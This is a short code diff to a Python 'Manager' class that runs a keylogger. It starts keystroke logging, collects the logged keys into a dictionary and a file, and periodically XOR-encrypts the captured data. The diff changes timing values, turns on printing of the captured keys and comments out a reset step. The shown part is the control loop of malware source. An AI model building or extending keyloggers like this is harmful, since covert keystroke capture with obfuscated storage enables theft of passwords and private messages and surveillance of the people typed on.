@@ -1,5 +1,4 @@
 from time import sleep
-
 from keyLogger import *
 from writer import *
 from encryptor import *
@@ -14,11 +13,11 @@ class Manager:
         self.l.start_logging()
 
     def activity(self):
-        """Perform the keylogging activity,
+        """Perform the KeyLogging activity,
         writing data to a dictionary and file, and encrypting it periodically."""
-        minute = 5
+        minute = 60
         send_encryption = 5
-        reset = 15
+        reset = 3
         dw = DictWriter()
         fw = FileWriter()
         count = 0
@@ -28,7 +27,7 @@ class Manager:
             count += 1
             # Get the list of logged keys
             get_list = self.l.get_logged_keys()
-            # print(get_list)
+            print(get_list)
             # Write the list of characters to the dictionary writer
             if get_list:
                 dw.write(get_list)
@@ -42,9 +41,10 @@ class Manager:
                     dict_encrypt = XorEncryptor().encrypt(get_dict)
                     # print(dict_encrypt)
                     # Write the encrypted dictionary to the file
+                    print(str(get_dict))
                     fw.write(dict_encrypt)
                 if count >= reset:
-                    DictWriter()
+                    # DictWriter()
                     count = 0
 
 
